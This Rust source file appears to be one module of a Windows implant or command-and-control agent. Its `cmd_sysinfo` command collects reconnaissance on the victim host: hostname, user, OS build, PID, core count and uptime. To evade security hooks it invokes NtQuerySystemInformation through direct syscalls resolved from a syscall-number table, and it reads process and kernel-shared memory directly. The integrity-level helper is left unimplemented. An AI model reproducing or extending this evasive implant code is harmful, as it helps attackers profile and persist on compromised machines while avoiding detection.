use crate::core::{invoke, ssn_table};

fn wide_to_string(wide: &[u16]) -> String {
    let mut s = String::with_capacity(wide.len());
    for &c in wide {
        if c == 0 {
            break
        }
        s.push(if c < 128 {
            c as u8 as char
        } else {
            '?'
        });
    };
    s
}

pub unsafe fn cmd_sysinfo() -> Result<String, String> {
    let table = ssn_table::syscall_table();
    let mut output = String::with_capacity(512);

    // Hostname
    let hostname = if !table.win32.get_computer_name_ex_w.is_null() {
        type FnGetComputerNameExW = unsafe extern "system" fn(u32, *mut u16, *mut u32) -> i32;
        let func: FnGetComputerNameExW = core::mem::transmute(table.win32.get_computer_name_ex_w);
        let mut buf = [0u16; 64];
        let mut size: u32 = 64;
        if func(3, buf.as_mut_ptr(), &mut size) != 0 {
            wide_to_string(&buf[..size as usize])
        } else {
            String::from("unkown")
        }
    } else {
        String::from("unkown")
    };

    // Username
    let username = if !table.win32.get_user_name_w.is_null() {
        type FnGetUserNameW = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
        let func: FnGetUserNameW = core::mem::transmute(table.win32.get_user_name_w);
        let mut buf = [0u16; 64];
        let mut size: u32 = 64;
        if func(buf.as_mut_ptr(), &mut size) != 0 && size > 1 {
            wide_to_string(&buf[..size as usize - 1])
        } else {
            String::from("unkown")
        }
    }  else {
        String::from("unkown")
    };

    // OS version
    let mut os_info = crate::core::types::OsVersionInfoExW {
        os_version_info_size: core::mem::size_of::<crate::core::types::OsVersionInfoExW>() as u32,
        major_version: 0,
        minor_version: 0,
        build_number: 0,
        platform_id: 0,
        csd_version: [0u16; 128],
        service_pack_major: 0,
        service_pack_minor: 0,
        suite_mask: 0,
        product_type: 0,
        reserved: 0
    };
    if !table.win32.rtl_get_version.is_null() {
        crate::core::win32::rtl_get_version(&mut os_info);
    }
    // PID from TEB
    let teb: u64;
    core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
    let pid = *((teb + 0x40) as *const u64) as u32;

    // Uptime from KUSER_SHARED_DATA
    let kuser = 0x7FFE0000usize as *const u8;
    let interrupt_low = *(kuser.add(0x08) as *const u32) as u64;
    let interrupt_high = *(kuser.add(0x0C) as *const u32) as u64;
    let uptime_ms = ((interrupt_high << 32) | interrupt_low) / 10000;
    let uptime_hours = uptime_ms / 3600000;
    let uptime_mins = (uptime_ms % 3600000) / 60000;

    // CPU cores via NtQuerySystemInformation(SystemBasicInformation)
    let cores = {
        let mut info = core::mem::MaybeUninit::<[u8; 64]>::zeroed();
        let mut rlen: u32 = 0;
        let st = invoke::syscall4(
            table.ssns.nt_query_system_information.ssn, 
            table.ssns.nt_query_system_information.syscall_addr as usize, 
            0, 
            info.as_mut_ptr() as usize, 
            64, 
            &mut rlen as *mut u32 as usize
        );
        if st == 0 {
            let buf = info.assume_init();
            buf[0x38] as u32 // NumberOfProcessors at offset 0x38 on x64
        } else {
            0u32
        }
    };

    let integrity = query_integrity(); 
    output.push_str(&alloc::format!("  Hostname   : {}\n", hostname));
    output.push_str(&alloc::format!("  Username   : {}\n", username));
    output.push_str(&alloc::format!("  OS         : Windows {}.{} Build {}\n", os_info.major_version, os_info.minor_version, os_info.build_number));
    output.push_str(&alloc::format!("  PID        : {}\n", pid));
    output.push_str(&alloc::format!("  Arch       : x64\n"));
    output.push_str(&alloc::format!("  Integrity  : {}\n", integrity));
    output.push_str(&alloc::format!("  Cores      : {}\n", cores));
    output.push_str(&alloc::format!("  Uptime     : {}h {}m\n", uptime_hours, uptime_mins));

    Ok(output)
}

unsafe fn query_integrity() -> &'static str {
    unimplemented!()
}